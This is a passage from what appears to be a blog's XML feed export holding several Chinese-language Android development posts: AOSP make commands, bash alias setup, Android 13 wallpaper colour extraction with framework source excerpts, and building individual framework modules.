title="四、附录：常用make命令"></a>四、附录：常用make命令</h2><ol><li><strong>make -jX</strong><br>X表示数字，这个命令将编译Android系统并生成镜像，XX表示可以使用到的CPU核数，这在配置好的电脑上特别有用，公司的16核ubuntu服务器执行make -j16只要不到20分钟，而双核PC上需要4个小时！</li><li><strong>make snod</strong><br>这条命令将重新生成镜像，消耗的时间很少，类似WinCE的makeimg过程，如果你修改了一些数据文件（如音乐、视频）等文件时比较有用。</li><li><strong>make cts</strong><br>这条命令将编译CTS套机，编译出的结果放在out目录对应版的data/app目录下面。CTS测试时有用</li><li><strong>make installclean</strong><br>这条命令清除out目录下对应板文件夹中的内容，也就是相当于make clean，通常如果改变了一些数据文件（如去掉）、最好执行以下make installclean，否则残留在out目录下的还会被打包进去。</li><li><strong>mm/mm -B</strong><br>开发调试中最喜欢这条命令了，在修改了的目录下执行这条命令，就能智能地进行编译，输出的文件在通过adb推送到目标机，可以很方便地调试。<br>1 .<strong>make sdk</strong><br>这条命令可以生成可发布的SDK，目前还没试过，据说需要JDK1.5</li><li><strong>make Setting</strong><br>可以单独编译setting这个模块，目前还没试，猜想是不是可以单独编译Email、Music这些模块</li><li><strong>make bootimage</strong><br>用这条命令可以生成boot.img,这个镜像文件中包含Linux Kernel，Ram disk，生成的boot.img只能通过fastboot进行烧写，这在只修改了Linux内核的时候有用</li><li><strong>make systemimage</strong><br>同上，不过是生成system.img用的。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Android </tag>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux(Ubuntu)自定义命令的使用</title>
      <link href="/2023/08/20/2023-08-20/"/>
      <url>/2023/08/20/2023-08-20/</url>
      
        <content type="html"><![CDATA[<p>Linux如何自定义自己的命令呢？修改 系统中的 ~/.bashrc 文件即可</p><p>在这个文件最后面使用alias命令重定义命令。</p><p>例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Custom <span class="built_in">command</span> begin</span></span><br><span class="line"></span><br><span class="line">alias androidq=&#x27;cd /home/longzhiye/mount/project/androidq/&#x27;</span><br><span class="line">alias androidt=&#x27;cd /home/longzhiye/mount/project/androidt/&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Custom <span class="built_in">command</span> end</span></span><br></pre></td></tr></table></figure><p>修改完成之后要使用命令<strong>source  ~/.bashrc</strong>刷新</p><p>测试结果如下:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">longzhiye@longzhiye-laptop:~$ androidt</span><br><span class="line">longzhiye@longzhiye-laptop:~/mount/project/androidt$ </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Android </tag>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 13 取色引擎详解</title>
      <link href="/2023/08/19/2023-08-19/"/>
      <url>/2023/08/19/2023-08-19/</url>
      
        <content type="html"><![CDATA[<h2 id="1、-应用如何获取壁纸颜色？"><a href="#1、-应用如何获取壁纸颜色？" class="headerlink" title="1、 应用如何获取壁纸颜色？"></a>1、 应用如何获取壁纸颜色？</h2><h3 id="1-1、调用getWallpaperColors获取壁纸颜色"><a href="#1-1、调用getWallpaperColors获取壁纸颜色" class="headerlink" title="1.1、调用getWallpaperColors获取壁纸颜色"></a>1.1、调用getWallpaperColors获取壁纸颜色</h3><p>其实WallpaperManager从很早之前就提供了getWallpaperColors接口<br><strong>/frameworks/base/core/java/android/app/WallpaperManager.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="meta">@UnsupportedAppUsage</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@Nullable</span> WallpaperColors <span class="title function_">getWallpaperColors</span><span class="params">(<span class="type">int</span> which, <span class="type">int</span> userId)</span> &#123;</span><br><span class="line">        StrictMode.assertUiContext(mContext, <span class="string">&quot;getWallpaperColors&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> sGlobals.getWallpaperColors(which, userId, mContext.getDisplayId());</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line">        WallpaperColors <span class="title function_">getWallpaperColors</span><span class="params">(<span class="type">int</span> which, <span class="type">int</span> userId, <span class="type">int</span> displayId)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (which != FLAG_LOCK &amp;&amp; which != FLAG_SYSTEM) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(</span><br><span class="line">                        <span class="string">&quot;Must request colors for exactly one kind of wallpaper&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> mService.getWallpaperColors(which, userId, displayId);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">                <span class="comment">// Can&#x27;t get colors, connection lost.</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="1-2、注册OnColorsChangedListener接口监听壁纸颜色"><a href="#1-2、注册OnColorsChangedListener接口监听壁纸颜色" class="headerlink" title="1.2、注册OnColorsChangedListener接口监听壁纸颜色"></a>1.2、注册OnColorsChangedListener接口监听壁纸颜色</h3><h4 id="1-2-1、获取整个壁纸颜色"><a href="#1-2-1、获取整个壁纸颜色" class="headerlink" title="1.2.1、获取整个壁纸颜色"></a>1.2.1、获取整个壁纸颜色</h4><p><strong>/frameworks/base/core/java/android/app/WallpaperManager.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addOnColorsChangedListener</span><span class="params">(<span class="meta">@NonNull</span> OnColorsChangedListener listener,</span></span><br><span class="line"><span class="params">            <span class="meta">@NonNull</span> Handler handler)</span> &#123;</span><br><span class="line">        addOnColorsChangedListener(listener, handler, mContext.getUserId());</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="使用范例："><a href="#使用范例：" class="headerlink" title="使用范例："></a>使用范例：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">WallpaperManager wallpaperManager=(WallpaperManager) getSystemService(Context.WALLPAPER_SERVICE);</span><br><span class="line">        wallpaperManager.addOnColorsChangedListener(<span class="keyword">new</span> <span class="title class_">WallpaperManager</span>.OnColorsChangedListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onColorsChanged</span><span class="params">(WallpaperColors colors, <span class="type">int</span> which)</span> &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure><p>1.2.2、获取壁纸区域颜色(需要源码引用)<br><strong>/frameworks/base/core/java/android/app/WallpaperManager.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@hide</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addOnColorsChangedListener</span><span class="params">(<span class="meta">@NonNull</span> LocalWallpaperColorConsumer callback,</span></span><br><span class="line"><span class="params">            List&lt;RectF&gt; regions)</span> <span class="keyword">throws</span> IllegalArgumentException &#123;</span><br><span class="line">        <span class="keyword">for</span> (RectF region : regions) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!LOCAL_COLOR_BOUNDS.contains(region)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Regions must be within bounds &quot;</span></span><br><span class="line">                        + LOCAL_COLOR_BOUNDS);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sGlobals.addOnColorsChangedListener(callback, regions, FLAG_SYSTEM,</span><br><span class="line">                                                 mContext.getUserId(), mContext.getDisplayId());</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>==Tip: LocalWallpaperColorConsumer是hide接口，非源码编译的Apk无法引用==</p><h4 id="使用范例：-1"><a href="#使用范例：-1" class="headerlink" title="使用范例："></a>使用范例：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">addOnColorsChangedListener(<span class="keyword">new</span> <span class="title class_">LocalWallpaperColorConsumer</span>() &#123;</span><br><span class="line">    <span class="meta">@java</span>.lang.Override</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onColorsChanged</span><span class="params">(RectF area, WallpaperColors colors)</span> &#123;</span><br><span class="line">                </span><br><span class="line">    &#125;</span><br><span class="line">&#125;,handler);</span><br></pre></td></tr></table></figure><h3 id="1-3、使用WallpaperColors"><a href="#1-3、使用WallpaperColors" class="headerlink" title="1.3、使用WallpaperColors"></a>1.3、使用WallpaperColors</h3><p>取出的数据都封装在WallpaperColors中，可通过以下接口获取到原始数据<br><strong>/frameworks/base/core/java/android/app/WallpaperColors.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取墙纸最具视觉代表性的颜色。“视觉上具有代表性”是指在图像中很容易被注意到，可能发生在高频率。不为空</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@NonNull</span> Color <span class="title function_">getPrimaryColor</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> mMainColors.get(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取壁纸的第二个最杰出的颜色。可以为空</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@Nullable</span> Color <span class="title function_">getSecondaryColor</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> mMainColors.size() &lt; <span class="number">2</span> ? <span class="literal">null</span> : mMainColors.get(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获得壁纸的第三个最杰出的颜色。可以为空</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@Nullable</span> Color <span class="title function_">getTertiaryColor</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> mMainColors.size() &lt; <span class="number">3</span> ? <span class="literal">null</span> : mMainColors.get(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//最杰出的颜色列表,按重要性排序</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@NonNull</span> List&lt;Color&gt; <span class="title function_">getMainColors</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Collections.unmodifiableList(mMainColors);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//得到所有提取出来的颜色，key是颜色的rgb int值 ，value是出现次数 </span></span><br><span class="line"> <span class="keyword">public</span> <span class="meta">@NonNull</span> Map&lt;Integer, Integer&gt; <span class="title function_">getAllColors</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Collections.unmodifiableMap(mAllColors);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>框架中只是负责提取出原始颜色，但有些时候直接使用原始颜色，并不能达到最好的效果。</p><p>例如：PixelLauncher的插件实现颜色动态变化，除了从Wallpaper中拿到颜色，还进行了二次加工，使其更符合Material Desgin的风格，这也是符合“Monet”主题系统 中的一部分，目前是没有开源的。所以一方或三方若想使用该特性，可以按需进行选择和二次加工。</p><h2 id="2、根据壁纸取色，能取出多少种颜色，颜色的格式和使用场景是什么？"><a href="#2、根据壁纸取色，能取出多少种颜色，颜色的格式和使用场景是什么？" class="headerlink" title="2、根据壁纸取色，能取出多少种颜色，颜色的格式和使用场景是什么？"></a>2、根据壁纸取色，能取出多少种颜色，颜色的格式和使用场景是什么？</h2><p>在Android 13上，内存低的机器 ，最多取出五种色值，内存高的机器，最多取出128种颜色。<br><strong>/frameworks/base/core/java/android/app/WallpaperColors.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> WallpaperColors <span class="title function_">fromBitmap</span><span class="params">(<span class="meta">@NonNull</span> Bitmap bitmap,</span></span><br><span class="line"><span class="params">            <span class="meta">@FloatRange</span> (from = <span class="number">0f</span>, to = <span class="number">1f</span>)</span> <span class="type">float</span> dimAmount) &#123;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">if</span> (ActivityManager.isLowRamDeviceStatic()) &#123;</span><br><span class="line">            palette = Palette</span><br><span class="line">                    .from(bitmap, <span class="keyword">new</span> <span class="title class_">VariationalKMeansQuantizer</span>())</span><br><span class="line">                    .maximumColorCount(<span class="number">5</span>)</span><br><span class="line">                    .resizeBitmapArea(MAX_WALLPAPER_EXTRACTION_AREA)</span><br><span class="line">                    .generate();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            palette = Palette</span><br><span class="line">                    .from(bitmap, <span class="keyword">new</span> <span class="title class_">CelebiQuantizer</span>())</span><br><span class="line">                    .maximumColorCount(<span class="number">128</span>)</span><br><span class="line">                    .resizeBitmapArea(MAX_WALLPAPER_EXTRACTION_AREA)</span><br><span class="line">                    .generate();</span><br><span class="line">        &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><ul><li>取出的是一个WallpaperColors对象，其中包含三种主颜色，以及一个保存了所有提取出颜色的Color数组(Hide)。</li><li>目前的应用场景主要是PixelLauncher、SystemUI、GBoard</li></ul><h2 id="3、能从动态壁纸中取色吗？"><a href="#3、能从动态壁纸中取色吗？" class="headerlink" title="3、能从动态壁纸中取色吗？"></a>3、能从动态壁纸中取色吗？</h2><p>很可惜，Google并没有为动态壁纸提供默认的取色逻辑。</p><p>壁纸的取色，最终会调用到WallpaperService的onComputeColors中，但该方法是空实现，框架只是提供了最基本的获取接口而已。</p><p>所以在Android 13之前，无论是静态壁纸或是动态 壁纸，若想要其他模块能获取到壁纸颜色的话，需要壁纸提供方，在实现WallpaperService的Engine时，也一并实现onCompleteColors方法，然后在颜色变化时调用notifyColorsChanged。<br><strong>/frameworks/base/core/java/android/service/wallpaper/WallpaperService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">notifyColorsChanged</span><span class="params">()</span> &#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//关键调用</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">WallpaperColors</span> <span class="variable">newColors</span> <span class="operator">=</span> onComputeColors();</span><br><span class="line">            <span class="keyword">if</span> (mConnection != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">//通知给监听壁纸颜色变化的模块</span></span><br><span class="line">                mConnection.onWallpaperColorsChanged(newColors, mDisplay.getDisplayId());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                 Log.w(TAG, <span class="string">&quot;Can&#x27;t notify system because wallpaper connection &quot;</span></span><br><span class="line">                        + <span class="string">&quot;was not established.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            Log.w(TAG, <span class="string">&quot;Can&#x27;t notify system because wallpaper connection was lost.&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//重写该方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@Nullable</span> WallpaperColors <span class="title function_">onComputeColors</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>如图：<br>特性|&lt; Android 13|Android 13<br>–|–|–<br>静态壁纸|没有默认实现|提供了默认实现，可以根据区域取色<br>动态壁纸|空实现|空实现</p><h2 id="4、壁纸取色失败会使用默认颜色吗？"><a href="#4、壁纸取色失败会使用默认颜色吗？" class="headerlink" title="4、壁纸取色失败会使用默认颜色吗？"></a>4、壁纸取色失败会使用默认颜色吗？</h2><p>壁纸其实是通过Palette接口进行颜色提取的，基本上都能取到至少一种颜色。当真的取出失败或取出的颜色如果不符合期望，需要采用另外一套默认颜色，这是由各个各个业务去处理的，比如Launcher中的LauncherAppWidgetHostView，重写了setColorResources方法<br><strong>/packages/apps/Launcher3/src/com/android/launcher3/widget/LauncherAppWidgetHostView.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setColorResources</span><span class="params">(<span class="meta">@Nullable</span> SparseIntArray colors)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (colors == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">//关键点1，提取不到颜色，会重置插件的颜色</span></span><br><span class="line">        resetColorResources();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//关键点2，设置插件的颜色</span></span><br><span class="line">        <span class="built_in">super</span>.setColorResources(colors);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="5、Widget-取色的整体流程是怎样？"><a href="#5、Widget-取色的整体流程是怎样？" class="headerlink" title="5、Widget 取色的整体流程是怎样？"></a>5、Widget 取色的整体流程是怎样？</h2><p>具体流程见下图：</p><p><img src="/images/20230819/20230819001.png"></p><p>PixelLauncher是通过LocalWallpaperColorsExtractor的实现类进行颜色提取，该类继承于LocalColorExtractor，该类存在于Launcher3中，是空实现。可以看出，Google专门将Monet算法部分折分隐藏，只公开框架部分。</p><p>而LocalWallpaperColorsExtractor是通过调用WallpaperManager.addOnColorsChangedListener接口，获取onColorsChanged(RectF rectF, WallpaperColors wallpaperColors)中的返回信息，然后再对WallpaperColors中的颜色信息进行二次加工处理。</p><h2 id="6、Widget-能使用的颜色数量和范围"><a href="#6、Widget-能使用的颜色数量和范围" class="headerlink" title="6、Widget 能使用的颜色数量和范围"></a>6、Widget 能使用的颜色数量和范围</h2><p>Widget能使用的色值数量没有限制，从android.R.color.system_neutrall_0（#FFFFFF） 到android.R.color.system_accent3_1000（#000000）都是合法范围。</p><h2 id="7、为什么现有第三方Launcher即使在Android13上，Widget的取色也会无效，而-Pixel-Launcher可以。"><a href="#7、为什么现有第三方Launcher即使在Android13上，Widget的取色也会无效，而-Pixel-Launcher可以。" class="headerlink" title="7、为什么现有第三方Launcher即使在Android13上，Widget的取色也会无效，而 Pixel Launcher可以。"></a>7、为什么现有第三方Launcher即使在Android13上，Widget的取色也会无效，而 Pixel Launcher可以。</h2><p>第三方 Launcher 代码中虽然已经有调用AppWidgetHostView.setColorResources，但是因为其提取颜色的LocalColorExtractor是空实现，所以没有实际效果。而Pixel Launcher 自己写了一个LocalWallpaperColorsExtractor去继承LocalColorExtractor。详见以下代码：</p><p><strong>/packages/apps/Launcher3/src/com/android/launcher3/widget/LocalColorExtractor.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> LocalColorExtractor <span class="title function_">newInstance</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Overrides.getObject(WallpaperColors.class, context.getApplicationContext(),</span><br><span class="line">            R.string.local_colors_extraction_class);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>local_colors_extraction_class 该值定义在PixelLauncher中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;string name=&quot;local_colors_extraction_class&quot;&gt;com.google.android.apps.nexuslauncher.widget.LocalWallpaperColorsExtractor&lt;/string&gt;</span><br></pre></td></tr></table></figure><h2 id="8、是否可以固定设置一套或者几套颜色，去overlay-壁纸的取色？"><a href="#8、是否可以固定设置一套或者几套颜色，去overlay-壁纸的取色？" class="headerlink" title="8、是否可以固定设置一套或者几套颜色，去overlay 壁纸的取色？"></a>8、是否可以固定设置一套或者几套颜色，去overlay 壁纸的取色？</h2><p>可以，Android 13已经在secure表中预定义了theme_customization_overlay_packages字段，在其中配置了是否要根据主屏幕变色还是预置颜色，然后进行资源Overlay的。<br>Android 原生设置入口</p><p><img src="/images/20230819/20230819002.png"></p><p>theme_customization_overlay_packages字段含义<br>字段|含义|取值范围<br>–|–|–<br>android.theme.customization.color_index|选择颜色索引|0~n<br>android.theme.customization.system_palette|中立色|color<br>android.theme.customization.accent_color|强调色|color<br>android.theme.customization.color_source|采用跟随壁纸颜色还是基本颜色|present \ home_wallpaper \ lock_wallpaper<br>android.theme.customization.color_both”|区分当前壁纸设置类型|1 锁屏和主屏幕， 0 只设置其中一项</p><p>我们可以直接使用或借鉴这套逻辑，预置几套色值，并设置为使用基本颜色。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android单独编译framework模块</title>
      <link href="/2023/08/13/2023-08-13/"/>
      <url>/2023/08/13/2023-08-13/</url>
      
        <content type="html"><![CDATA[<h2 id="一、如果修改了frameworks-base-services目录下的代码，比如你在PhoneWindowManager修改了部分代码，这时候可以通过单编译的方式快速烧录到指定机器，无需系统全编"><a href="#一、如果修改了frameworks-base-services目录下的代码，比如你在PhoneWindowManager修改了部分代码，这时候可以通过单编译的方式快速烧录到指定机器，无需系统全编" class="headerlink" title="一、如果修改了frameworks/base/services目录下的代码，比如你在PhoneWindowManager修改了部分代码，这时候可以通过单编译的方式快速烧录到指定机器，无需系统全编"></a>一、如果修改了frameworks/base/services目录下的代码，比如你在PhoneWindowManager修改了部分代码，这时候可以通过单编译的方式快速烧录到指定机器，无需系统全编</h2><h3 id="前提：如果需要单编译，需要先全编一下系统，再进行单编译"><a href="#前提：如果需要单编译，需要先全编一下系统，再进行单编译" class="headerlink" title="前提：如果需要单编译，需要先全编一下系统，再进行单编译"></a>前提：如果需要单编译，需要先全编一下系统，再进行单编译</h3><p>步骤：</p><p>1.首先需要进入frameworks/base/services下，打开Android.bp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">// merge all required services into one jar</span><br><span class="line">// ============================================================</span><br><span class="line">java_library &#123;</span><br><span class="line">    name: &quot;services&quot;,</span><br><span class="line">    defaults: [&quot;services_java_defaults&quot;],</span><br><span class="line">    installable: true,</span><br><span class="line"></span><br><span class="line">    dex_preopt: &#123;</span><br><span class="line">        app_image: true,</span><br><span class="line">        profile: &quot;art-profile&quot;,</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    srcs: [&quot;:services-main-sources&quot;],</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>java_library里面的name：services，这个services就代表模块名</p><p>然后通过make -j12 services，将生成的如下文件全部替换到板子上并修改权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">out/target/product/xxx/system/framework/oat/arm/services.odex</span><br><span class="line">out/target/product/xxx/system/framework/oat/arm/services.vdex</span><br><span class="line">out/target/product/xxx/system/framework/oat/arm/services.art</span><br><span class="line"> </span><br><span class="line">out/target/product/xxx/system/framework/services.jar.prof</span><br><span class="line">out/target/product/xxx/system/framework/services.jar</span><br></pre></td></tr></table></figure><p>板子上对应的文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">system/framework/oat/arm/services.art</span><br><span class="line">system/framework/oat/arm/services.odex</span><br><span class="line">system/framework/oat/arm/services.vdex</span><br><span class="line"> </span><br><span class="line">system/framework/services.jar</span><br><span class="line">system/framework/services.jar.prof</span><br></pre></td></tr></table></figure><p>替换掉之后执行sync，然后reboot重启</p><h2 id="二、如果修改了frameworks-base-目录下的代码，同上一样，进入到frameworks-base-下的Android-bp"><a href="#二、如果修改了frameworks-base-目录下的代码，同上一样，进入到frameworks-base-下的Android-bp" class="headerlink" title="二、如果修改了frameworks/base/目录下的代码，同上一样，进入到frameworks/base/下的Android.bp"></a>二、如果修改了frameworks/base/目录下的代码，同上一样，进入到frameworks/base/下的Android.bp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">java_library 